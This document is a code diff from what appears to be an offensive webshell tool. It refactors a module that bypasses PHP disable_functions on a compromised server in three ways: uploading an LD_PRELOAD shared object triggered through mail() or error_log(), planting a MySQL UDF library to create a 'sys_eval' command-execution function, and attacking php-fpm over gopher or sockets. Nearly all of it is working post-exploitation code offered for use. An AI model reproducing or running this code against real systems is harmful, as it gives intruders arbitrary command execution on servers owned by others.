@@ -1,5 +1,6 @@
 from os import path
 from uuid import uuid4
+from random import choice
 
 from libs.app import readline
 from libs.config import alias, color, gget, gset
@@ -27,17 +28,6 @@ windows_test_list = total_test_list - mode_linux_set
 linux_test_list = total_test_list - mode_windows_set
 
 
-def get_detectd_ld_preload():
-    return """$a=array('mail','error_log', 'mb_send_mail', 'imap_mail');
-$disabled = explode(',', ini_get('disable_functions'));
-foreach ($a as $v){
-    if (is_callable($v) && !in_array($v, $disabled)){
-        echo $v;
-        break;
-    }
-}"""
-
-
 def get_detectd_ext(extname: str):
     return """if (extension_loaded("%s")){echo "exist";}""" % extname
 
@@ -53,24 +43,57 @@ def set_mode(mode: int, test: bool = False):
             print(color.red(f"\nNo {ext} extension\n"))
             return False
     if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
-        disable_func_list = gget("webshell.disable_functions", "webshell")
+        if is_windows():
+            print(color.red("\nNo ld_preload function!\n"))
+            return False
+
+        disable_funcs = gget("webshell.disable_functions", "webshell")
+
+        # can't work if putenv is disabled
+        if ("putenv" in disable_funcs):
+            print(color.red("\nputenv is disabled\n"))
+            return False
+
+        # check if already set ld_preload
         if (not gget("webshell.ld_preload_path", "webshell", None)):
             filename = "/tmp/%s.so" % str(uuid4())
-            ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
-            upload_result = upload(
-                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x86_64.so"), filename, True)
-            if (not upload_result):
-                return
-            gset("webshell.ld_preload_path", filename, True, "webshell")
-            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
-            if ("putenv" in disable_func_list):
-                print(color.red("\nputenv is disabled\n"))
-                return False
-            if (not ld_preload_func):
+            # get ld_preload trigger function
+            available_trigger_funcs = [
+                'mail', 'error_log', 'mb_send_mail', 'imap_mail']
+            ld_preload_funcs = [
+                f for f in available_trigger_funcs if f not in disable_funcs]
+            if (not ld_preload_funcs):
                 print(color.red("\nNo ld_preload function!\n"))
                 return False
+            ld_preload_func = choice(ld_preload_funcs)
+
+            # get target architecture
+            bits = gget("webshell.arch", namespace="webshell")
+            if not bits:
+                print("\nInput target system bits (32/64): ", end="")
+                _ = readline().strip()
+                if (_ == "32"):
+                    bits = 32
+                elif (_ == "64"):
+                    bits = 64
+                else:
+                    print(color.red("\nUnknown bits\n"))
+                    return False
+            bits = str(bits)
+
+            # upload so
+            upload_result = upload(
+                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x"+bits+".so"), filename, True)
+            if (not upload_result):
+                print(color.red("\nUpload error\n"))
+                return
+
+            gset("webshell.ld_preload_path", filename, True, "webshell")
+            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
+
     elif (mode == 8):  # udf
         if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
+            # detect plugin dir
             print(color.yellow(f"\nDetect plugin dir..."))
             plugin_dir_res = execute_sql_command(
                 "show variables like '%plugin_dir%';", raw=True)
@@ -79,6 +102,8 @@ def set_mode(mode: int, test: bool = False):
             else:
                 print(color.red(f"\nCould not find plugin_dir"))
                 return False
+
+            # make plugin dir
             print(color.yellow(f"\nMake plugin dir..."))
             phpcode = '''if(!is_dir("%s") and !mkdir("%s", 0777, true)){print("fail");}''' % (
                 plugin_dir, plugin_dir)
@@ -86,25 +111,28 @@ def set_mode(mode: int, test: bool = False):
             if (not res or "fail" in res.r_text):
                 print(color.red(f"\nMake plugin dir failed!\n"))
                 return False
-            system = "windows" if (
-                gget("webshell.iswin", "webshell")) else "linux"
-            print("\nReference Information:", gget("webshell.os_version", "webshell"))
-            print("\nInput target system bits (32/64/default): ", end="")
-            bits = "64"
-            _ = readline().strip()
-            if (_ == "32"):
-                bits = 32
-            elif (_ == "64"):
-                bits = 64
-            elif (not _):
-                bits = gget("webshell.arch", namespace="webshell")
-                if not bits:
-                    print(color.red(f"\nUnknown architecture, please set it by yourself"))
-                    return False
-            elif (_ in ["back", "exit", "quit"]):
-                return False
 
-            udf_ext = ".dll" if (gget("webshell.iswin", "webshell")) else ".so"
+            system = "windows" if is_windows() else "linux"
+            print("\nReference Information:", gget(
+                "webshell.os_version", "webshell"))
+
+            bits = gget("webshell.arch", namespace="webshell")
+            if not bits:
+                print("\nInput target system bits (32/64): ", end="")
+                _ = readline().strip()
+                if (_ == "32"):
+                    bits = 32
+                elif (_ == "64"):
+                    bits = 64
+                elif (_ in ["back", "exit", "quit"]):
+                    return False
+                else:
+                    print(color.red("\nUnknown bits\n"))
+                    return False
+            bits = str(bits)
+
+            # upload so / dll
+            udf_ext = ".dll" if is_windows() else ".so"
             udf_path = plugin_dir + "tmp" + udf_ext
             print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
             upload_result = upload(
@@ -113,6 +141,8 @@ def set_mode(mode: int, test: bool = False):
                 print(color.red("\nUpload failed\n"))
                 return
             gset("webshell.udf_path", udf_path, True, "webshell")
+
+            # create function sys_eval
             print(color.yellow(f"\nCreate function sys_eval..."))
             execute_sql_command(
                 f"create function sys_eval returns string soname 'tmp{udf_ext}'", raw=True)
@@ -123,6 +153,7 @@ def set_mode(mode: int, test: bool = False):
             else:
                 print(color.red(f"\nCreate funtion failed\n"))
                 return False
+
         else:
             print(color.red(f"\nNo connection to database or dbms isn't mysql\n"))
             return False
@@ -132,12 +163,14 @@ def set_mode(mode: int, test: bool = False):
             print(color.red(f"\nTarget php not run by php-fpm!\n"))
             return False
         requirements_dict = {'host': '127.0.0.1', 'port': 9000}
-        attack_type = input("attack_type[gopher(need curl extension)/sock/http_sock]:").lower()
+        attack_type = input(
+            "attack_type[gopher(need curl extension)/sock/http_sock]:").lower()
         if (attack_type not in ["gopher", "sock", "http_sock"]):
             return False
 
         gset("webshell.bdf_fpm.type", attack_type, True, "webshell")
 
+        # input sock path
         if (attack_type == "sock"):
             sock_path = "/var/run/php7-fpm.sock"
             new_v = input(f"sock_path[{sock_path}]:")
@@ -145,6 +178,7 @@ def set_mode(mode: int, test: bool = False):
                 sock_path = new_v
             gset("webshell.bdf_fpm.sock_path", sock_path, True, "webshell")
         else:
+            # input fpm http host and port
             for k, v in requirements_dict.items():
                 new_v = input(f"{k}[{v}]:")
                 if k == 'port':
@@ -156,10 +190,12 @@ def set_mode(mode: int, test: bool = False):
                         return False
                 if new_v:
                     requirements_dict[k] = new_v
-            gset("webshell.bdf_fpm.host", requirements_dict["host"], True, "webshell")
-            gset("webshell.bdf_fpm.port", str(requirements_dict["port"]), True, "webshell")
+            gset("webshell.bdf_fpm.host",
+                 requirements_dict["host"], True, "webshell")
+            gset("webshell.bdf_fpm.port", str(
+                requirements_dict["port"]), True, "webshell")
     if (not test):
-        if (mode == 7):
+        if (mode in (7, 10)):
             print(color.yellow(
                 f"\nYou may need to wait 1 second to get the result..\n"))
         print(
@@ -267,8 +303,9 @@ def run(mode: str = '0'):
 
         Need:
         - php-fpm
-          - gopher type: curl extension
-
+          - gopher: curl extension, fpm can access by http
+          - sock: stream_socket_client function, fpm can access by sock
+          - http_sock: fsockopen / pfsockopen function, fpm can access by http
     """
     if (mode == "close"):
         mode = -1
